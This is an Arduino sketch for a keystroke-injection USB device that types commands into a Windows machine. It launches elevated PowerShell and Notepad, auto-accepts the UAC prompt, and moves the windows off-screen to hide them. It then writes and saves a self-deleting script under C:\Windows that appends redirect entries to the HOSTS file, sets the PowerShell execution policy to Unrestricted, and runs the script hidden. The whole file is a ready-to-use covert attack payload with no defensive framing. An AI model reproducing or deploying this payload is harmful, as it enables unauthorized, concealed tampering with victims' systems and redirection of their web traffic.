#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup()
{
  // start Keyboard stream
  Keyboard.begin();

  delay(500); //500 = time to wait 

  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(1000);

  Keyboard.print("powershell Start-Process notepad -Verb runAs");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.releaseAll();

  delay(500);

  typeKey(KEY_RETURN);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(1000);

  Keyboard.print("m");

  delay(1000);

  for(int i = 0; i < 100; i++) {
    typeKey(KEY_DOWN_ARROW);
  }

  typeKey(KEY_RETURN);

  Keyboard.print("$redirectionAddress=\"192.168.1.1\""); //ip adress

  typeKey(KEY_RETURN);

  Keyboard.print("$redirectedSite=\"https://github.com/cometteetcaramel\""); //website to redirect 

  typeKey(KEY_RETURN);

  Keyboard.print("$hosts = $redirectionAddress + ' ' + $redirectedSite");

  typeKey(KEY_RETURN);

  Keyboard.print("$hosts2 = $redirectionAddress + ' www.' + $redirectedSite");

  typeKey(KEY_RETURN);

  Keyboard.print("Add-Content -Value $hosts -Path 'C:\\WINDOWS\\SYSTEM32\\DRIVERS\\ETC\\HOSTS'");

  typeKey(KEY_RETURN);

  Keyboard.print("Add-Content -Value $hosts2 -Path 'C:\\WINDOWS\\SYSTEM32\\DRIVERS\\ETC\\HOSTS'");

  typeKey(KEY_RETURN);

  Keyboard.print("Remove-Item $MyINvocation.InvocationName");

  typeKey(KEY_RETURN);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('s');
  Keyboard.releaseAll();

  delay(1000);

  Keyboard.print("C:\\Windows\\config-20657.ps1");

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();

  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("powershell Start-Process cmd -Verb runAs");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.releaseAll();

  delay(1000);

  Keyboard.print("mode con:cols=14 lines=1");

  typeKey(KEY_RETURN);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("m");

  delay(500);

  for(int i = 0; i < 100; i++) {
    typeKey(KEY_DOWN_ARROW);
  }

  typeKey(KEY_RETURN);

  Keyboard.print("powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("powershell.exe -windowstyle hidden -File C:\\Windows\\config-20657.ps1");

  typeKey(KEY_RETURN);

  // stream end
  Keyboard.end();
}

void loop() {}